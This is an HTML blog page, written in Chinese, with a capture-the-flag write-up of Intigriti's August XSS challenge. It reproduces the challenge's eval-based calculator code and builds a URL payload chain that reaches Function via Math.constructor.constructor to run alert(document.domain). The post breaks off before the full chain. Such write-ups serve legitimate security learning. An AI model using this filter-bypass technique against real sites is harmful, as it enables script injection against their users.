@@ -1,0 +1,510 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge"/>
+<meta name="viewport" content="width=device-width, initial-scale=1"/>
+
+<!--Description-->
+
+
+
+    <meta name="description" content="Intigriti’s August XSS challenge
+Author:堇姬Naup
+
+題目https://challenge-0823.intigriti.io/有一個計算機可以輸入東西，只要有執行alert(document.domain)就可以過了image
+Source code12"/>
+
+
+<!--Author-->
+
+    <meta name="author" content="Naup堇姬"/>
+
+
+<!--Open Graph Title-->
+
+    <meta property="og:title" content="Intigriti-August-XSS-challenge"/>
+
+
+<!--Open Graph Description-->
+
+    <meta property="og:description" content="Intigriti’s August XSS challenge
+Author:堇姬Naup
+
+題目https://challenge-0823.intigriti.io/有一個計算機可以輸入東西，只要有執行alert(document.domain)就可以過了image
+Source code12"/>
+
+
+<!--Open Graph Site Name-->
+    <meta property="og:site_name" content="堇姬 Naup&#39;s Blog"/>
+
+<!--Type page-->
+
+    <meta property="og:type" content="article"/>
+
+
+<!--Page Cover-->
+
+
+    <meta property="og:image" content="http://example.com/img/bg2.jpg"/>
+
+
+<meta name="twitter:card" content="summary_large_image"/>
+
+
+
+
+    <meta name="twitter:image" content="http://example.com/img/bg2.jpg"/>
+
+
+<!-- Title -->
+
+<title>Intigriti-August-XSS-challenge | 堇姬 Naup&#39;s Blog</title>
+
+<!-- Bootstrap Core CSS -->
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/bootstrap@4.4.1/dist/css/bootstrap.min.css">
+
+<!-- Custom CSS -->
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<!-- Custom Fonts -->
+<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/font-awesome/5.11.0/css/all.min.css" />
+<link href="//fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic" rel="stylesheet" type="text/css"/>
+<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/font-awesome/5.11.0/css/all.min.css" />
+<link href="//fonts.googleapis.com/css2?family=Noto+Sans+TC:wght@100;300;400;500;700;900&display=swap" rel="stylesheet">
+<link href="//fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800" rel="stylesheet" type="text/css"/>
+
+<!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
+<!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
+<!--[if lt IE 9]>
+<script src="//oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+<script src="//oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
+<![endif]-->
+
+<!-- Gallery -->
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/featherlight@1.4.0/src/featherlight.css" integrity="sha256-30DV/STftlyQ6v8yaOWlabammvCYtRJERLj/m0b3zno=" crossorigin="anonymous">
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/lightgallery@1.6.11/dist/css/lightgallery.min.css">
+
+<!-- favicon -->
+
+<link rel="icon" href="/img/icon.jpg"/>
+
+
+
+    <!-- Google Analytics -->
+    
+
+
+<!-- hexo injector head_end start -->
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css">
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hexo-math@4.0.0/dist/style.css">
+<!-- hexo injector head_end end --><meta name="generator" content="Hexo 7.1.1"></head>
+<!-- Head tag -->
+
+<body>
+
+    <!-- Menu -->
+    <!-- Navigation -->
+<nav class="navbar navbar-default navbar-custom navbar-fixed-top bg-transparent position-absolute w-100 p-0" id="nav">
+    <div class="container pl-0 pr-0">
+        <!-- Brand and toggle get grouped for better mobile display -->
+        <div class="navbar-header page-scroll">
+            <a class="navbar-brand text-white p-1 pl-3" href="/">堇姬 Naup's Blog</a>
+        </div>
+        <div class="navbar-nav float-right">
+            <button class="btn btn-link search-btn navbar-item" data-toggle="modal" data-target="#searchModal">
+                <i class="fas fa-search"></i>
+            </button>
+        </div>
+    </div>
+    <!-- /.container -->
+</nav>
+
+    <!-- Main Content -->
+    <!-- Page Header -->
+<!-- Set your background image for this header in your post front-matter: cover -->
+
+<header class="intro-header" style="background-image: url('/img/bg2.jpg')">
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-12 col-md-12 text-center">
+                <div class="post-heading text-white">
+                    <h1>Intigriti-August-XSS-challenge</h1>
+                    
+                </div>
+            </div>
+        </div>
+    </div>
+</header>
+
+<!-- Post Content -->
+<article>
+    <div class="container">
+        <div class="row">
+            <!-- Post Main Content -->
+            <div class="col-lg-8 offset-lg-2 col-md-10 offset-md-1">
+                
+                    <span class="meta d-inline-block">
+    
+    
+    <!-- Date -->
+    
+        <span class="post-meta-split">&nbsp;|&nbsp;</span>
+        <i class="far fa-calendar-check fa-fw"></i>
+        2024-04-27
+    
+    <!-- word count and read count -->
+    
+
+    
+
+    
+</span>  
+                
+                <h1 id="Intigriti’s-August-XSS-challenge"><a href="#Intigriti’s-August-XSS-challenge" class="headerlink" title="Intigriti’s August XSS challenge"></a>Intigriti’s August XSS challenge</h1><blockquote>
+<p>Author:堇姬Naup</p>
+</blockquote>
+<h2 id="題目"><a href="#題目" class="headerlink" title="題目"></a>題目</h2><p><a target="_blank" rel="noopener" href="https://challenge-0823.intigriti.io/">https://challenge-0823.intigriti.io/</a><br>有一個計算機可以輸入東西，只要有執行<code>alert(document.domain)</code>就可以過了<br><div class="img-item" data-src="https://hackmd.io/_uploads/SJGjYCtWR.png" data-sub-html=".caption"><img src="https://hackmd.io/_uploads/SJGjYCtWR.png" alt="image"><div class="img-caption d-block text-center"><span class="center-caption text-muted border-bottom">image</span></div></div></p>
+<h2 id="Source-code"><a href="#Source-code" class="headerlink" title="Source code"></a>Source code</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">  (<span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">    name = <span class="string">&#x27;Pure Functional Math Calculator&#x27;</span></span><br><span class="line">    <span class="keyword">let</span> next</span><br><span class="line">    <span class="title class_">Math</span>.<span class="property">random</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">      <span class="keyword">if</span> (!<span class="variable language_">this</span>.<span class="property">seeds</span>) &#123;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">seeds</span> = [<span class="number">0.62536</span>, <span class="number">0.458483</span>, <span class="number">0.544523</span>, <span class="number">0.323421</span>, <span class="number">0.775465</span>]</span><br><span class="line">        next = <span class="variable language_">this</span>.<span class="property">seeds</span>[<span class="keyword">new</span> <span class="title class_">Date</span>().<span class="title function_">getTime</span>() % <span class="variable language_">this</span>.<span class="property">seeds</span>.<span class="property">length</span>]</span><br><span class="line">      &#125;</span><br><span class="line">      next = next * <span class="number">1103515245</span> + <span class="number">12345</span></span><br><span class="line">      <span class="keyword">return</span> (next / <span class="number">65536</span>) % <span class="number">32767</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">assert</span>(<span class="title class_">Math</span>.<span class="title function_">random</span>() &gt; <span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> result = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;.result&#x27;</span>)</span><br><span class="line">    <span class="keyword">const</span> stack = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;.stack-block&#x27;</span>)</span><br><span class="line">    <span class="keyword">let</span> operators = []</span><br><span class="line"></span><br><span class="line">    <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;.pad&#x27;</span>).<span class="title function_">addEventListener</span>(<span class="string">&#x27;click&#x27;</span>, handleClick)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> qs = <span class="keyword">new</span> <span class="title class_">URLSearchParams</span>(<span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">search</span>)</span><br><span class="line">    <span class="keyword">if</span> (qs.<span class="title function_">get</span>(<span class="string">&#x27;q&#x27;</span>)) &#123;</span><br><span class="line">      <span class="keyword">const</span> ops = qs.<span class="title function_">get</span>(<span class="string">&#x27;q&#x27;</span>).<span class="title function_">split</span>(<span class="string">&#x27;,&#x27;</span>)</span><br><span class="line">      <span class="keyword">if</span> (ops.<span class="property">length</span> &gt;= <span class="number">100</span>) &#123;</span><br><span class="line">        <span class="title function_">alert</span>(<span class="string">&#x27;Max length of array is 99, got:&#x27;</span> + ops.<span class="property">length</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_">init</span>()</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">for</span> (<span class="keyword">let</span> op <span class="keyword">of</span> ops) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!op.<span class="title function_">startsWith</span>(<span class="string">&#x27;Math.&#x27;</span>)) &#123;</span><br><span class="line">          <span class="title function_">alert</span>(<span class="string">`Operator should start with Math.: <span class="subst">$&#123;op&#125;</span>`</span>)</span><br><span class="line">          <span class="keyword">return</span> <span class="title function_">init</span>()</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!<span class="regexp">/^[a-zA-Z0-9.]+$/</span>.<span class="title function_">test</span>(op)) &#123;</span><br><span class="line">          <span class="title function_">alert</span>(<span class="string">`Invalid operator: <span class="subst">$&#123;op&#125;</span>`</span>)</span><br><span class="line">          <span class="keyword">return</span> <span class="title function_">init</span>()</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">for</span> (<span class="keyword">let</span> op <span class="keyword">of</span> ops) &#123;</span><br><span class="line">        <span class="title function_">addOperator</span>(op)</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="title function_">calculateResult</span>()</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="title function_">init</span>()</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">init</span>(<span class="params"></span>) &#123;</span><br><span class="line">      <span class="title function_">addOperator</span>(<span class="string">&#x27;Math.random&#x27;</span>)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">addOperator</span>(<span class="params">name</span>) &#123;</span><br><span class="line">      result.<span class="property">innerText</span> = <span class="string">`<span class="subst">$&#123;name&#125;</span>(<span class="subst">$&#123;result.innerText&#125;</span>)`</span></span><br><span class="line">      operators.<span class="title function_">push</span>(name)</span><br><span class="line"></span><br><span class="line">      <span class="keyword">let</span> div = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&#x27;div&#x27;</span>)</span><br><span class="line">      div.<span class="property">textContent</span> = <span class="string">`<span class="subst">$&#123;operators.length&#125;</span>. <span class="subst">$&#123;name&#125;</span>`</span></span><br><span class="line">      stack.<span class="title function_">prepend</span>(div)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">calculateResult</span>(<span class="params"></span>) &#123;</span><br><span class="line">      result.<span class="property">innerText</span> = <span class="built_in">eval</span>(result.<span class="property">innerText</span>)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">handleClick</span>(<span class="params">e</span>) &#123;</span><br><span class="line">      <span class="keyword">let</span> className = e.<span class="property">target</span>.<span class="property">className</span></span><br><span class="line">      <span class="keyword">let</span> text = e.<span class="property">target</span>.<span class="property">innerText</span></span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (className === <span class="string">&#x27;btn-fn&#x27;</span>) &#123;</span><br><span class="line">        <span class="title function_">addOperator</span>(<span class="string">`Math.<span class="subst">$&#123;text&#125;</span>`</span>)</span><br><span class="line">      &#125; <span class="keyword">else</span> <span class="keyword">if</span> (className === <span class="string">&#x27;btn-ac&#x27;</span>) &#123;</span><br><span class="line">        result.<span class="property">innerText</span> = <span class="string">&#x27;Math.random()&#x27;</span>;</span><br><span class="line">        stack.<span class="property">innerHTML</span> = <span class="string">&#x27;&lt;div&gt;1. Math.random&lt;/div&gt;&#x27;</span></span><br><span class="line">        operators = [<span class="string">&#x27;Math.random&#x27;</span>]</span><br><span class="line">      &#125; <span class="keyword">else</span> <span class="keyword">if</span> (className === <span class="string">&#x27;btn-share&#x27;</span>) &#123;</span><br><span class="line">        <span class="title function_">alert</span>(<span class="string">&#x27;Please copy the URL!&#x27;</span>)</span><br><span class="line">        location.<span class="property">search</span> = <span class="string">&#x27;?q=&#x27;</span> + operators.<span class="title function_">join</span>(<span class="string">&#x27;,&#x27;</span>)</span><br><span class="line">      &#125; <span class="keyword">else</span> <span class="keyword">if</span> (className === <span class="string">&#x27;btn-equal&#x27;</span>) &#123;</span><br><span class="line">        <span class="title function_">calculateResult</span>()</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;)()</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<h2 id="解決"><a href="#解決" class="headerlink" title="解決"></a>解決</h2><p>他用eval來執行我們輸入的，處理你計算機的所有函數</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">calculateResult</span>(<span class="params"></span>) &#123;</span><br><span class="line">  result.<span class="property">innerText</span> = <span class="built_in">eval</span>(result.<span class="property">innerText</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>他用<code>q=</code>來接收，然後用逗號 <code>,</code> 將其分割，並且payload用到的函數不可以&gt;99，並且每個函數都要用<code>Math</code>開頭</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://challenge-0823.intigriti.io/challenge/index.html/?q=Math.random,Math.tan,Math.floor </span><br></pre></td></tr></table></figure>
+<p>會被用成<code>f3(f2(f1(...)))</code>的樣子</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> qs = <span class="keyword">new</span> <span class="title class_">URLSearchParams</span>(<span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">search</span>)</span><br><span class="line">    <span class="keyword">if</span> (qs.<span class="title function_">get</span>(<span class="string">&#x27;q&#x27;</span>)) &#123;</span><br><span class="line">        <span class="keyword">const</span> ops = qs.<span class="title function_">get</span>(<span class="string">&#x27;q&#x27;</span>).<span class="title function_">split</span>(<span class="string">&#x27;,&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> (ops.<span class="property">length</span> &gt;= <span class="number">100</span>) &#123;</span><br><span class="line">            <span class="title function_">alert</span>(<span class="string">&#x27;Max length of array is 99, got:&#x27;</span> + ops.<span class="property">length</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="title function_">init</span>()</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">let</span> op <span class="keyword">of</span> ops) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!op.<span class="title function_">startsWith</span>(<span class="string">&#x27;Math.&#x27;</span>)) &#123;</span><br><span class="line">                <span class="title function_">alert</span>(<span class="string">`Operator should start with Math.: <span class="subst">$&#123;op&#125;</span>`</span>)</span><br><span class="line">                <span class="keyword">return</span> <span class="title function_">init</span>()</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (!<span class="regexp">/^[a-zA-Z0-9.]+$/</span>.<span class="title function_">test</span>(op)) &#123;</span><br><span class="line">                <span class="title function_">alert</span>(<span class="string">`Invalid operator: <span class="subst">$&#123;op&#125;</span>`</span>)</span><br><span class="line">                <span class="keyword">return</span> <span class="title function_">init</span>()</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>首先會想創建一個<code>Function()</code>來去執行js</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> sum = <span class="keyword">new</span> <span class="title class_">Function</span>(<span class="string">&#x27;alert(1);&#x27;</span>);</span><br><span class="line"><span class="title function_">sum</span>()</span><br></pre></td></tr></table></figure>
+<p>但是要怎麼透過<code>Math</code>來去叫到<code>Function()</code><br>這時候就可以用之前學到的<code>constructor</code>來呼叫了</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">Person</span>(<span class="params">name</span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">name</span> = name;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> person = <span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&#x27;John&#x27;</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(person.<span class="property">constructor</span>); </span><br></pre></td></tr></table></figure>
+<p>他會找到創建 person的<code>Person()</code></p>
+<p>如果嘗試對Object，做<code>constructor</code><br>會抓到創建Object的<code>Function()</code><br><div class="img-item" data-src="https://hackmd.io/_uploads/rJqy8k9ZC.png" data-sub-html=".caption"><img src="https://hackmd.io/_uploads/rJqy8k9ZC.png" alt="image"><div class="img-caption d-block text-center"><span class="center-caption text-muted border-bottom">image</span></div></div></p>
+<p>Math是一個Object，如果你對<code>Math</code>先做一次<code>.constructor</code>會抓到<code>Object</code>，在去做一次<code>.constructor</code>，就會抓到<code>Function()</code>，建立一個匿名函數</p>
+<p><div class="img-item" data-src="https://hackmd.io/_uploads/Bkas8yqWC.png" data-sub-html=".caption"><img src="https://hackmd.io/_uploads/Bkas8yqWC.png" alt="image"><div class="img-caption d-block text-center"><span class="center-caption text-muted border-bottom">image</span></div></div></p>
+<p>而如果用sort的話可以run起來這個匿名函數內容</p>
+<blockquote>
+<p>透過Function()建立匿名函數來讓Function()包的string被執行到，再透過sort run匿名函數，就可以成功執行js</p>
+</blockquote>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Math</span>.<span class="property">seeds</span>.<span class="title function_">sort</span>(<span class="title class_">Math</span>.<span class="property">constructor</span>.<span class="title function_">constructor</span>(<span class="params"><span class="string">&#x27;alert(document.domain)&#x27;</span></span>))</span><br></pre></td></tr></table></figure>
+<p>constructor.constructor,Math.seeds.sort</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>接下來就是要嘗試拼出<code>&#39;alert(document.domain)&#39;</code></p>
+<p>這邊或許可以利用看看</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.charAt()</span><br></pre></td></tr></table></figure>
+<p>如果用</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;ABCD&quot;.charAt(0)</span><br></pre></td></tr></table></figure>
+<p>會抓到<code>A</code></p>
+<p>找找看有沒有可用的string可以去掉用到string<br><div class="img-item" data-src="https://hackmd.io/_uploads/r17-Jg5W0.png" data-sub-html=".caption"><img src="https://hackmd.io/_uploads/r17-Jg5W0.png" alt="image"><div class="img-caption d-block text-center"><span class="center-caption text-muted border-bottom">image</span></div></div></p>
+<p>看了Math底下的東西，會發現底下函數有些有包含道string<br>像是</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Math.acos.name</span><br></pre></td></tr></table></figure>
+<p><div class="img-item" data-src="https://hackmd.io/_uploads/SJRx8ecWA.png" data-sub-html=".caption"><img src="https://hackmd.io/_uploads/SJRx8ecWA.png" alt="image"><div class="img-caption d-block text-center"><span class="center-caption text-muted border-bottom">image</span></div></div></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Math.acos.name.charAt(0)</span><br></pre></td></tr></table></figure>
+<p>就可以抓到a<br>但是怎麼拿到0<br><div class="img-item" data-src="https://hackmd.io/_uploads/BycnHgqZC.png" data-sub-html=".caption"><img src="https://hackmd.io/_uploads/BycnHgqZC.png" alt="image"><div class="img-caption d-block text-center"><span class="center-caption text-muted border-bottom">image</span></div></div><br>可以用seeds裡面的數字，0.多被轉成int變成0，所以可以拿到第一個數字<br>用<code>pop()</code>可以拿到最後一個<br>所以構造(最後再把push進去a到seeds存下來)</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Math.seeds.push(Math.acos.name.charAt(Math.seeds.pop()))</span><br></pre></td></tr></table></figure>
+
+<p>再來要拿<code>l</code><br>當你用<code>Math.seeds.push</code>時，同時會噴出陣列長度，此時這裡會噴出5來，把他丟進去<code>cos</code>會等於<code>0.28366218546</code>，被轉int一樣會變成，看到log第一個自是l，所以直接抓。<br><div class="img-item" data-src="https://hackmd.io/_uploads/BJ_I9Z5-C.png" data-sub-html=".caption"><img src="https://hackmd.io/_uploads/BJ_I9Z5-C.png" alt="image"><div class="img-caption d-block text-center"><span class="center-caption text-muted border-bottom">image</span></div></div></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Math.seeds.pop,Math.acos.name.charAt,Math.seeds.push,Math.cos,Math.log.name.charAt,Math.seeds.push</span><br></pre></td></tr></table></figure>
+<p>拿<code>e</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Math.cos,Math.expm1.name.charAt,Math.seeds.push</span><br></pre></td></tr></table></figure>
+<p>拿<code>r</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Math.cos,Math.round.name.charAt,Math.seeds.push</span><br></pre></td></tr></table></figure>
+
+<p>拿<code>t</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Math.cos,Math.trunc.name.charAt,Math.seeds.push</span><br></pre></td></tr></table></figure>
+<p>組出<code>alert</code></p>
+<p>目前payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Math.seeds.pop,Math.acos.name.charAt,Math.seeds.push,Math.cos,Math.log.name.charAt,Math.seeds.push,Math.cos,Math.expm1.name.charAt,Math.seeds.push,Math.cos,Math.round.name.charAt,Math.seeds.push,Math.cos,Math.trunc.name.charAt,Math.seeds.push</span><br></pre></td></tr></table></figure>
+<p><div class="img-item" data-src="https://hackmd.io/_uploads/HJ76sZqbC.png" data-sub-html=".caption"><img src="https://hackmd.io/_uploads/HJ76sZqbC.png" alt="image"><div class="img-caption d-block text-center"><span class="center-caption text-muted border-bottom">image</span></div></div></p>
+<p>再來就遇到了<code>(</code><br>這裡應該要嘗試看看有沒有辦法用ASCII呼叫到<br>但我究竟要怎麼取的能夠把ASCII轉char的函數呢?</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">String.fromCharCode()</span><br></pre></td></tr></table></figure>
+<p>可以去把ASCII轉char<br><div class="img-item" data-src="https://hackmd.io/_uploads/H1dKpb9bR.png" data-sub-html=".caption"><img src="https://hackmd.io/_uploads/H1dKpb9bR.png" alt="image"><div class="img-caption d-block text-center"><span class="center-caption text-muted border-bottom">image</span></div></div></p>
+<p>不過我需要用到String物件，我要如何抓到他?<br>你可以使用前面用過的</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.constructor</span><br></pre></td></tr></table></figure>
+<p>對一個string做<code>.constructor</code>會抓到物件String，就可以抓到<code>.fromCharCode()</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Math.acos.name.constructor.fromCharCode()</span><br></pre></td></tr></table></figure>
+<p><div class="img-item" data-src="https://hackmd.io/_uploads/SJDf0Z9ZC.png" data-sub-html=".caption"><img src="https://hackmd.io/_uploads/SJDf0Z9ZC.png" alt="image"><div class="img-caption d-block text-center"><span class="center-caption text-muted border-bottom">image</span></div></div></p>
+<p>這個方法可以拿到40，所以將他放入<code>Math.acos.name.constructor.fromCharCode()</code>可以得到<code>(</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Math.ceil(Math.log2(Math.cosh(Math.clz32(9)))) </span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Math.clz32,Math.cosh,Math.log2,Math.ceil,Math.toString.name.constructor.fromCharCode,Math.seeds.push</span><br></pre></td></tr></table></figure>
+
+<p>跟上面payload組起來</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Math.seeds.pop,Math.acos.name.charAt,Math.seeds.push,Math.cos,Math.log.name.charAt,Math.seeds.push,Math.cos,Math.expm1.name.charAt,Math.seeds.push,Math.cos,Math.round.name.charAt,Math.seeds.push,Math.cos,Math.trunc.name.charAt,Math.seeds.push,Math.clz32,Math.cosh,Math.log2,Math.ceil,Math.toString.name.constructor.fromCharCode,Math.seeds.push</span><br></pre></td></tr></table></figure>
+<p><div class="img-item" data-src="https://hackmd.io/_uploads/S1JaJMqZ0.png" data-sub-html=".caption"><img src="https://hackmd.io/_uploads/S1JaJMqZ0.png" alt="image"><div class="img-caption d-block text-center"><span class="center-caption text-muted border-bottom">image</span></div></div></p>
+<p>再來繼續<br>抓<code>d</code><br><div class="img-item" data-src="https://hackmd.io/_uploads/S1XreM5-A.png" data-sub-html=".caption"><img src="https://hackmd.io/_uploads/S1XreM5-A.png" alt="image"><div class="img-caption d-block text-center"><span class="center-caption text-muted border-bottom">image</span></div></div></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Math.tan,Math.constructor.defineProperties.name.charAt,Math.seeds.push</span><br></pre></td></tr></table></figure>
+<p>等等…基本上都是同個概念了</p>
+<p>直接把他寫完，得到一個陣列存了我們要的<code>alert(document.domain)</code></p>
